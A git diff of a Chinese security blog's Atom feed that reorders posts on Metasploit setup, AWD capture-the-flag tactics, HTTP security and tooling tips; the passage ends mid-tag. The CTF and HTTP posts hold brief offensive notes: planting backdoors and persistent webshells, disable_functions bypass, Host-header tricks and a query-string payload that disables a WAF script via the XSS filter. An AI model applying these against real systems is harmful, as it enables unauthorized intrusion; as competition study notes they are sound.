@@ -86,34 +86,6 @@
   </entry>
   
   <entry>
-    <title>解决BT5下pcaprub的问题</title>
-    <link href="https://alem0n.github.io/2019/03/02/%E8%A7%A3%E5%86%B3BT5%E4%B8%8Bpcaprub%E7%9A%84%E9%97%AE%E9%A2%98-2019/"/>
-    <id>https://alem0n.github.io/2019/03/02/解决BT5下pcaprub的问题-2019/</id>
-    <published>2019-03-02T11:00:00.000Z</published>
-    <updated>2019-03-02T12:24:45.000Z</updated>
-    
-    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>这是因为在BT5中Pcap模块没有安装，其实解决这个问题很简单，在Metasploit 安装目录中找到pcaprub目录再编译或安装ruby模块.</p><p>​       以/opt/framework3/msf3/external/pcaprub为例</p><p>​       首先切换到此目录下</p><p>​    cd /opt/framework3/msf3/external/pcaprub</p><p><img src="/images/2019-03-02-解决BT5下pcaprub的问题-2019/clip_image002-1551524398995.jpg" alt="4256111C773.jpeg"></p><p>​    安装Pcap模块</p><p>​    ruby extconf.rb &amp;&amp; make</p><p>​    make install</p><p><img src="/images/2019-03-02-解决BT5下pcaprub的问题-2019/clip_image004-1551524404783.jpg" alt="65CC6BC70BF.jpeg"></p><p>​    打开/opt/framework3/scripts/setenv.sh，添加pcaprub的路径：</p><p>​    vi /opt/framework3/scripts/setenv.sh</p><p>​    RUBYLIB=”…:/opt/framework3/ruby/lib/ruby/site_ruby/1.9.1/i686-linux:/opt/framework3/msf3/external/pcaprub“</p><p><img src="/images/2019-03-02-解决BT5下pcaprub的问题-2019/clip_image006-1551524411906.gif" alt="EF09E429D199.png"></p><p>​    重启msfconsole即可正常使用</p><p><img src="/images/2019-03-02-解决BT5下pcaprub的问题-2019/clip_image008-1551524417798.gif" alt="3AA27905B09E.png"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;p&gt;这是因为在BT5中Pcap模块没有安装，其实解决这个问题很简单，在Metasploit 安装目录中找到pcaprub目录再编译或安装ruby模块.&lt;/p&gt;
-&lt;p&gt;​     
-      
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="https://alem0n.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="Linux" scheme="https://alem0n.github.io/tags/Linux/"/>
-    
-      <category term="渗透测试" scheme="https://alem0n.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
     <title>Ubuntu开启root用户登录</title>
     <link href="https://alem0n.github.io/2019/03/02/Ubuntu%E5%BC%80%E5%90%AFroot%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95-2019/"/>
     <id>https://alem0n.github.io/2019/03/02/Ubuntu开启root用户登录-2019/</id>
@@ -138,52 +110,30 @@
   </entry>
   
   <entry>
-    <title>AWD思路</title>
-    <link href="https://alem0n.github.io/2019/02/27/AWD%E6%80%9D%E8%B7%AF-2019/"/>
-    <id>https://alem0n.github.io/2019/02/27/AWD思路-2019/</id>
-    <published>2019-02-27T13:00:00.000Z</published>
-    <updated>2019-05-21T03:34:42.231Z</updated>
+    <title>解决BT5下pcaprub的问题</title>
+    <link href="https://alem0n.github.io/2019/03/02/%E8%A7%A3%E5%86%B3BT5%E4%B8%8Bpcaprub%E7%9A%84%E9%97%AE%E9%A2%98-2019/"/>
+    <id>https://alem0n.github.io/2019/03/02/解决BT5下pcaprub的问题-2019/</id>
+    <published>2019-03-02T11:00:00.000Z</published>
+    <updated>2019-03-02T12:24:45.000Z</updated>
     
-    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>AWD骚操作</p><a id="more"></a><p>五分钟一轮</p><p>文件读取拿shell</p><p>在root目录下有flag.txt</p><p>拿到flag以自己本机上写批量脚本</p><p>自动提交flag脚本，五分钟一轮~<br>(绿色防御成功，红色代表已经被拿，服务宕机)，每五分钟check一次，check常用服务，服务宕机扣分比被拿flag大</p><p>防御成功加分，有队伍失分，失去的分数将会平摊给防御成功</p><p>拿到shell，把cat 命令 改名，<br>多传几个马和后门</p><p>重置服务选项，如果服务修复不回来，选择重置(大概三次，当次被打)</p><p>npc 处于不攻防的状态，拿npc的flag给分，只有一个npc（自己测出来，npc）</p><p>抓流量，（每15分钟发一个wireshrak流量包）</p><p>普通用户弱口令登陆基本不存在</p><p>重启服务权限</p><p>拿到备份源码，全局搜索eval和assert<br>出题人肯定会出后门漏洞 webshell</p><p>去年有weely 木马，出题人设置大马小马一块</p><p>不死马没有权限，重置</p><p>不ddos不算犯规，拿数据库尝试</p><p>能连外网</p><p>不死马，重置完，选手举手再打一遍</p>]]></content>
+    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>这是因为在BT5中Pcap模块没有安装，其实解决这个问题很简单，在Metasploit 安装目录中找到pcaprub目录再编译或安装ruby模块.</p><p>​       以/opt/framework3/msf3/external/pcaprub为例</p><p>​       首先切换到此目录下</p><p>​    cd /opt/framework3/msf3/external/pcaprub</p><p><img src="/images/2019-03-02-解决BT5下pcaprub的问题-2019/clip_image002-1551524398995.jpg" alt="4256111C773.jpeg"></p><p>​    安装Pcap模块</p><p>​    ruby extconf.rb &amp;&amp; make</p><p>​    make install</p><p><img src="/images/2019-03-02-解决BT5下pcaprub的问题-2019/clip_image004-1551524404783.jpg" alt="65CC6BC70BF.jpeg"></p><p>​    打开/opt/framework3/scripts/setenv.sh，添加pcaprub的路径：</p><p>​    vi /opt/framework3/scripts/setenv.sh</p><p>​    RUBYLIB=”…:/opt/framework3/ruby/lib/ruby/site_ruby/1.9.1/i686-linux:/opt/framework3/msf3/external/pcaprub“</p><p><img src="/images/2019-03-02-解决BT5下pcaprub的问题-2019/clip_image006-1551524411906.gif" alt="EF09E429D199.png"></p><p>​    重启msfconsole即可正常使用</p><p><img src="/images/2019-03-02-解决BT5下pcaprub的问题-2019/clip_image008-1551524417798.gif" alt="3AA27905B09E.png"></p>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;AWD骚操作&lt;/p&gt;
+      
+      
+        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;p&gt;这是因为在BT5中Pcap模块没有安装，其实解决这个问题很简单，在Metasploit 安装目录中找到pcaprub目录再编译或安装ruby模块.&lt;/p&gt;
+&lt;p&gt;​     
+      
     
     </summary>
     
-      <category term="CTF" scheme="https://alem0n.github.io/categories/CTF/"/>
+      <category term="渗透测试" scheme="https://alem0n.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
+    
+      <category term="Linux" scheme="https://alem0n.github.io/tags/Linux/"/>
     
       <category term="渗透测试" scheme="https://alem0n.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="CTF" scheme="https://alem0n.github.io/tags/CTF/"/>
-    
-      <category term="网络" scheme="https://alem0n.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>http安全</title>
-    <link href="https://alem0n.github.io/2019/02/27/http%E5%8D%8F%E8%AE%AE-2019/"/>
-    <id>https://alem0n.github.io/2019/02/27/http协议-2019/</id>
-    <published>2019-02-27T13:00:00.000Z</published>
-    <updated>2019-05-21T03:34:42.234Z</updated>
-    
-    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>一些http知识</p><a id="more"></a><h3 id="http安全"><a href="#http安全" class="headerlink" title="http安全"></a>http安全</h3><ul><li><p>http请求头</p></li><li><p>http响应头</p></li><li><p>往端口发送字符串</p></li><li><p>\r\n 分割式</p></li></ul><h2 id="WebServer"><a href="#WebServer" class="headerlink" title="WebServer"></a>WebServer</h2><ul><li>Apache</li><li><p>Ngix</p></li><li><p>Apache</p></li><li><ul><li>默认prefork mode</li><li>同一连接用同一个进程处理</li><li>mod_php</li></ul><p>Nginx</p><ul><li>envent-driven</li><li>同一个连接请求用不同线程处理</li><li>php-fpm</li></ul></li></ul><p>php disabled functions 绕过</p><ul><li>/proc/self/mem</li><li>修改got</li><li>命令执行</li></ul><p>php运行内容,将把要执行open函数的命令,改为system函数</p><p>0ctf 2016</p><p>阿里CTF,决赛</p><p><a href="https://rdot.org/forum/showthread.php?t=3309" target="_blank" rel="noopener">https://rdot.org/forum/showthread.php?t=3309</a></p><p>针对 nigx模式下php-fpm 模式的进行</p><p>需要了解背后的机制与运行原理</p><h2 id="HTTP请求头"><a href="#HTTP请求头" class="headerlink" title="HTTP请求头"></a>HTTP请求头</h2><ul><li>Authorization</li><li>Cookie</li><li>Host</li><li>Referer</li><li>user-agent</li><li>X-Forwarded-For</li></ul><p>session中的key是在本地,value是在服务器端</p><p>Flask 框架中默认把session返回客户端,存在验证码算法破解</p><p>攻击思路,旁站拿shell,修改主站的session</p><p>session可能存在与tamper目录下,</p><h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><p>将host头,改为内部站点,有可能返回内网的内容</p><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>常用功能防盗链</p><p>referer为空的情况,</p><p>从http到https不会发送referer,反过来不会发送</p><p>跨协议不会发出referer</p><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p>判断用户浏览器</p><h4 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h4><p>获取时一般不会经过waf</p><p>反向代理,通过强行重写可以不受控制</p><p>遇到X-Forwarded-For不一定真的会有问题</p><h4 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h4><p>用来重定向</p><h4 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h4><p>用来设置客户端的session</p><p>Location 和 Set-cookie 经常用于CSRF</p><h4 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h4><p>浏览器为了防护反射型xss</p><p>X-XSS-Protection:0  //不会生效</p><p>X-XSS-Protection:1 //会自动去除掉,浏览器认为有问题的部分,浏览器默认状态</p><p>X-XSS-Protection:1;mode=block //如果有恶意内容,会自动阻止页面渲染</p><p>默认容易带来安全的副作用</p><ul><li><script src="waf.js"></script></li><li>/?xxx=<script src="waf.js"></script>  通过在url处加上waf代码,使得浏览器误认为是waf是客户端发送的数据,不予执行</li></ul><p>0ctf 2016 初赛</p><p><a href="https://github.com/5alt/ctf-challenges/blob/master/0ctf2016-qual/web500_guestbook/html/show.php" target="_blank" rel="noopener">https://github.com/5alt/ctf-challenges/blob/master/0ctf2016-qual/web500_guestbook/html/show.php</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var debug=false;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>统一资源标识符</p><h4 id="scheme"><a href="#scheme" class="headerlink" title="scheme"></a>scheme</h4><p>http,https,ftp</p><p>file,gopher,</p><h4 id="Electron-远程命令执行漏洞"><a href="#Electron-远程命令执行漏洞" class="headerlink" title="Electron 远程命令执行漏洞"></a>Electron 远程命令执行漏洞</h4><p>基于electron构建的app登记了协议,即可以使用该协议直接打开应用程序</p><p>打开恶意页面就能被入侵</p><p>2016年hitb 荷兰安全会议</p><h4 id="认证部分"><a href="#认证部分" class="headerlink" title="认证部分"></a>认证部分</h4><p>用于</p><p><a href="https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit</a></p><h3 id="host-1"><a href="#host-1" class="headerlink" title="host"></a>host</h3><p>浏览器自动修正</p><ul><li>5alt. me -&gt; 5alt.me</li><li>CRLF (DNS解析错误)</li></ul><p>判断绕过</p><ul><li>url.startswith(“<a href="http://www.qq.com&quot;" target="_blank" rel="noopener">http://www.qq.com&quot;</a>)</li><li>指向内网ip</li></ul><p>DNS Reind</p><p>homeograph attack</p><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>用http请求其他端口</p><ul><li>redis(容错机制)</li></ul><p>一些限制绕过</p><ul><li>火狐下crlf -&gt; xss</li></ul><h4 id="path"><a href="#path" class="headerlink" title="path"></a>path</h4><ul><li><a href="http://127.0.0.1/http/path.php?x=x" target="_blank" rel="noopener">http://127.0.0.1/http/path.php?x=x</a></li></ul><p>Ngix解析漏洞,剖析</p><p>1.jpg/1.php</p><p>原因</p><p>去年航电 hctf 出题</p><h3 id="query"><a href="#query" class="headerlink" title="query"></a>query</h3><p>urlencode</p><h4 id="Fregment"><a href="#Fregment" class="headerlink" title="Fregment"></a>Fregment</h4><p>浏览器中的Fregment 不会发生到服务器</p><p>XSS</p><h3 id="url-parser"><a href="#url-parser" class="headerlink" title="url parser"></a>url parser</h3><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>HTTP 是Web安全的基础</li><li>常见的点也会存在安全问题</li><li>搞安全要懂开发</li><li>多读文档</li><li>对问题深入探索原因</li></ul><p>渗透测试,周期短,目标是拿到shell,各种不同方式,渗透测试以目标为导向,安全研究以研究为导向,提出新的攻击方法,带动行业发展,安全研究偏向学术圈,渗透测试偏向工业圈,渗透测试不需要了解原理,安全研究需要关注动态</p><p>渗透测试的强度,和流程熟练度</p><p>找到合适自己的方法论,开发出自己的一套工具,或者是找到合适的工具</p><p>安全研究,是关注面更广,更注意细节</p><p>两者不存在壁垒</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;一些http知识&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="网络" scheme="https://alem0n.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
-    
-    
-      <category term="CTF" scheme="https://alem0n.github.io/tags/CTF/"/>
-    
-      <category term="网络" scheme="https://alem0n.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
     
   </entry>
   
@@ -238,72 +188,52 @@
   </entry>
   
   <entry>
-    <title>设置github代理</title>
-    <link href="https://alem0n.github.io/2019/02/27/%E8%AE%BE%E7%BD%AEgithub%E4%BB%A3%E7%90%86-2019/"/>
-    <id>https://alem0n.github.io/2019/02/27/设置github代理-2019/</id>
-    <published>2019-02-27T12:00:00.000Z</published>
-    <updated>2019-05-21T03:34:42.237Z</updated>
+    <title>AWD思路</title>
+    <link href="https://alem0n.github.io/2019/02/27/AWD%E6%80%9D%E8%B7%AF-2019/"/>
+    <id>https://alem0n.github.io/2019/02/27/AWD思路-2019/</id>
+    <published>2019-02-27T13:00:00.000Z</published>
+    <updated>2019-05-21T03:34:42.231Z</updated>
     
-    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>git下设置网络代理</p><a id="more"></a><h3 id="设置http、https代理"><a href="#设置http、https代理" class="headerlink" title="设置http、https代理"></a>设置http、https代理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy &apos;http://127.0.0.1:1080&apos;</span><br><span class="line">git config --global https.proxy &apos;https://127.0.0.1:1080&apos;</span><br><span class="line">走socks5</span><br><span class="line">git config --global http.proxy &apos;socks5://127.0.0.1:1080&apos;</span><br><span class="line">git config --global https.proxy &apos;socks5://127.0.0.1:1080&apos;</span><br></pre></td></tr></table></figure><p>取消</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>AWD骚操作</p><a id="more"></a><p>五分钟一轮</p><p>文件读取拿shell</p><p>在root目录下有flag.txt</p><p>拿到flag以自己本机上写批量脚本</p><p>自动提交flag脚本，五分钟一轮~<br>(绿色防御成功，红色代表已经被拿，服务宕机)，每五分钟check一次，check常用服务，服务宕机扣分比被拿flag大</p><p>防御成功加分，有队伍失分，失去的分数将会平摊给防御成功</p><p>拿到shell，把cat 命令 改名，<br>多传几个马和后门</p><p>重置服务选项，如果服务修复不回来，选择重置(大概三次，当次被打)</p><p>npc 处于不攻防的状态，拿npc的flag给分，只有一个npc（自己测出来，npc）</p><p>抓流量，（每15分钟发一个wireshrak流量包）</p><p>普通用户弱口令登陆基本不存在</p><p>重启服务权限</p><p>拿到备份源码，全局搜索eval和assert<br>出题人肯定会出后门漏洞 webshell</p><p>去年有weely 木马，出题人设置大马小马一块</p><p>不死马没有权限，重置</p><p>不ddos不算犯规，拿数据库尝试</p><p>能连外网</p><p>不死马，重置完，选手举手再打一遍</p>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;git下设置网络代理&lt;/p&gt;
+      &lt;p&gt;AWD骚操作&lt;/p&gt;
     
     </summary>
     
-      <category term="生活" scheme="https://alem0n.github.io/categories/%E7%94%9F%E6%B4%BB/"/>
+      <category term="CTF" scheme="https://alem0n.github.io/categories/CTF/"/>
     
     
-      <category term="生活" scheme="https://alem0n.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
+      <category term="渗透测试" scheme="https://alem0n.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
-      <category term="GitHub" scheme="https://alem0n.github.io/tags/GitHub/"/>
+      <category term="CTF" scheme="https://alem0n.github.io/tags/CTF/"/>
+    
+      <category term="网络" scheme="https://alem0n.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
     
   </entry>
   
   <entry>
-    <title>Next主题标签页标签随机颜色的设置方法</title>
-    <link href="https://alem0n.github.io/2019/02/27/Next%E4%B8%BB%E9%A2%98%E6%A0%87%E7%AD%BE%E9%A1%B5%E6%A0%87%E7%AD%BE%E9%9A%8F%E6%9C%BA%E9%A2%9C%E8%89%B2%E7%9A%84%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95-2019/"/>
-    <id>https://alem0n.github.io/2019/02/27/Next主题标签页标签随机颜色的设置方法-2019/</id>
-    <published>2019-02-27T12:00:00.000Z</published>
-    <updated>2019-05-21T03:34:42.235Z</updated>
+    <title>http安全</title>
+    <link href="https://alem0n.github.io/2019/02/27/http%E5%8D%8F%E8%AE%AE-2019/"/>
+    <id>https://alem0n.github.io/2019/02/27/http协议-2019/</id>
+    <published>2019-02-27T13:00:00.000Z</published>
+    <updated>2019-05-21T03:34:42.234Z</updated>
     
-    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>网上找了很久的办法，存下来</p><a id="more"></a><p>只需在<code>\themes\next\layout\page.swig</code>中的这一段中间</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tag-cloud-tags"</span>&gt;</span></span><br><span class="line">  &#123;&#123; tagcloud(&#123;min_font: 12, max_font: 30, amount: 200, color: true, start_color: '#ccc', end_color: '#111'&#125;) &#125;&#125;</span><br><span class="line">  ————————————————————插入代码位置——————————————————————————</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>加上如下代码就可以了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">  <span class="keyword">var</span> list = <span class="built_in">document</span>.querySelectorAll(<span class="string">'.tag-cloud-tags a'</span>);</span><br><span class="line">  <span class="built_in">Array</span>.prototype.forEach.call(list, (item, index) =&gt; &#123;</span><br><span class="line">    item.style.fontSize = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">29</span> + <span class="number">12</span>) + <span class="string">'px'</span>;<span class="comment">//12 ~ 40</span></span><br><span class="line">    item.style.color = <span class="string">'rgb('</span> + <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">201</span>) + <span class="string">', '</span> + <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">201</span>) + <span class="string">', '</span> + <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">201</span>) + <span class="string">')'</span>;<span class="comment">// 0,0,0 -&gt; 200,200,200</span></span><br><span class="line">  &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>Ps:</p><p>​    min_font和max_font代表最大最小文字，可以自行更改</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;网上找了很久的办法，存下来&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="生活" scheme="https://alem0n.github.io/categories/%E7%94%9F%E6%B4%BB/"/>
-    
-    
-      <category term="生活" scheme="https://alem0n.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-      <category term="Hexo" scheme="https://alem0n.github.io/tags/Hexo/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Python更换pip源</title>
-    <link href="https://alem0n.github.io/2019/02/27/Python%E6%9B%B4%E6%8D%A2pip%E6%BA%90-2019/"/>
-    <id>https://alem0n.github.io/2019/02/27/Python更换pip源-2019/</id>
-    <published>2019-02-27T12:00:00.000Z</published>
-    <updated>2019-05-21T03:34:42.235Z</updated>
-    
-    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>默认的pip源太慢，换成国内源会快很多</p> <a id="more"></a><p>Python更换pip源</p><p>对于Python开发用户来讲，PIP安装软件包是家常便饭。但国外的源下载速度实在太慢，浪费时间。而且经常出现下载后安装出错问题。所以把PIP安装源替换成国内镜像，可以大幅提升下载速度，还可以提高安装成功率。</p><p><strong>国内源：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">新版ubuntu要求使用https源，要注意。</span><br><span class="line"></span><br><span class="line">清华：https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">阿里云：http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line"></span><br><span class="line">华中理工大学：http://pypi.hustunique.com/</span><br><span class="line"></span><br><span class="line">山东理工大学：http://pypi.sdutlinux.org/ </span><br><span class="line"></span><br><span class="line">豆瓣：http://pypi.douban.com/simple/</span><br></pre></td></tr></table></figure><p><strong>临时使用：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以在使用pip的时候加参数-i http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">例如：pip install -i http://mirrors.aliyun.com/pypi/simple/ pyspider，这样就会从清华这边的镜像去安装pyspider库。</span><br></pre></td></tr></table></figure><p><strong>永久修改，一劳永逸：</strong></p><p>Linux下，修改 <code>~/.pip/pip.conf</code> (没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹)</p><p>内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">[install] trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure><p>windows下，直接在<code>user</code>目录中创建一个pip目录，如：<code>C:\Users\xx\pip</code>，新建文件<code>pip.ini</code>。内容同上。</p><p><strong>一、新建 pip 配置文件夹</strong></p><p>先在 windows “文件资源管理器” 地址栏 输入 <code>%APPDATA%</code> 按回车，打开程序自定义设置文件夹</p><p>然后，创建名为 <code>pip</code>  的文件夹，用于存放 <code>pip</code> 配置文件</p><p><img src="/images/2019-03-02-Python更换pip源-2019/clip_image002.jpg" alt="e_pip_folder.png"></p><p><strong>二、新建 pip 配置文件</strong></p><p>在刚才创建好的 <code>pip</code> 文件夹中，新建 名为 <code>pip.ini</code> 的配置文件</p><p><img src="/images/2019-03-02-Python更换pip源-2019/clip_image004.jpg" alt="pip_ini.png"></p><p><strong>三、设置 pip 国内源 (使用 阿里云 国内镜像)</strong></p><p>在 <code>pip.ini</code> 文件中输入以下内容，然后保存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url=http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line"></span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure><p><img src="/images/2019-03-02-Python更换pip源-2019/clip_image006.gif" alt="clipboard.png"></p><p><strong>四、验证设置</strong></p><p>按 windows 徽标+ R，输入 cmd，按回车，调出 windows 命令行窗口</p><p><img src="/images/2019-03-02-Python更换pip源-2019/clip_image008.jpg" alt="windows_cmd.png"></p><p>尝试用 pip 安装一个比较大一点的包，譬如 kivy.deps.gstreamer (约 120 M)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install kivy.deps.gstreamer</span><br></pre></td></tr></table></figure><p>注意到 pip 从阿里云 (aliyun) 下载，速度达到了每秒 7.5 M，快到飞起来</p><p><img src="/images/2019-03-02-Python更换pip源-2019/clip_image010.jpg" alt="liyun_mirror.png"></p>]]></content>
+    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p>一些http知识</p><a id="more"></a><h3 id="http安全"><a href="#http安全" class="headerlink" title="http安全"></a>http安全</h3><ul><li><p>http请求头</p></li><li><p>http响应头</p></li><li><p>往端口发送字符串</p></li><li><p>\r\n 分割式</p></li></ul><h2 id="WebServer"><a href="#WebServer" class="headerlink" title="WebServer"></a>WebServer</h2><ul><li>Apache</li><li><p>Ngix</p></li><li><p>Apache</p></li><li><ul><li>默认prefork mode</li><li>同一连接用同一个进程处理</li><li>mod_php</li></ul><p>Nginx</p><ul><li>envent-driven</li><li>同一个连接请求用不同线程处理</li><li>php-fpm</li></ul></li></ul><p>php disabled functions 绕过</p><ul><li>/proc/self/mem</li><li>修改got</li><li>命令执行</li></ul><p>php运行内容,将把要执行open函数的命令,改为system函数</p><p>0ctf 2016</p><p>阿里CTF,决赛</p><p><a href="https://rdot.org/forum/showthread.php?t=3309" target="_blank" rel="noopener">https://rdot.org/forum/showthread.php?t=3309</a></p><p>针对 nigx模式下php-fpm 模式的进行</p><p>需要了解背后的机制与运行原理</p><h2 id="HTTP请求头"><a href="#HTTP请求头" class="headerlink" title="HTTP请求头"></a>HTTP请求头</h2><ul><li>Authorization</li><li>Cookie</li><li>Host</li><li>Referer</li><li>user-agent</li><li>X-Forwarded-For</li></ul><p>session中的key是在本地,value是在服务器端</p><p>Flask 框架中默认把session返回客户端,存在验证码算法破解</p><p>攻击思路,旁站拿shell,修改主站的session</p><p>session可能存在与tamper目录下,</p><h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><p>将host头,改为内部站点,有可能返回内网的内容</p><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>常用功能防盗链</p><p>referer为空的情况,</p><p>从http到https不会发送referer,反过来不会发送</p><p>跨协议不会发出referer</p><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p>判断用户浏览器</p><h4 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h4><p>获取时一般不会经过waf</p><p>反向代理,通过强行重写可以不受控制</p><p>遇到X-Forwarded-For不一定真的会有问题</p><h4 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h4><p>用来重定向</p><h4 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h4><p>用来设置客户端的session</p><p>Location 和 Set-cookie 经常用于CSRF</p><h4 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h4><p>浏览器为了防护反射型xss</p><p>X-XSS-Protection:0  //不会生效</p><p>X-XSS-Protection:1 //会自动去除掉,浏览器认为有问题的部分,浏览器默认状态</p><p>X-XSS-Protection:1;mode=block //如果有恶意内容,会自动阻止页面渲染</p><p>默认容易带来安全的副作用</p><ul><li><script src="waf.js"></script></li><li>/?xxx=<script src="waf.js"></script>  通过在url处加上waf代码,使得浏览器误认为是waf是客户端发送的数据,不予执行</li></ul><p>0ctf 2016 初赛</p><p><a href="https://github.com/5alt/ctf-challenges/blob/master/0ctf2016-qual/web500_guestbook/html/show.php" target="_blank" 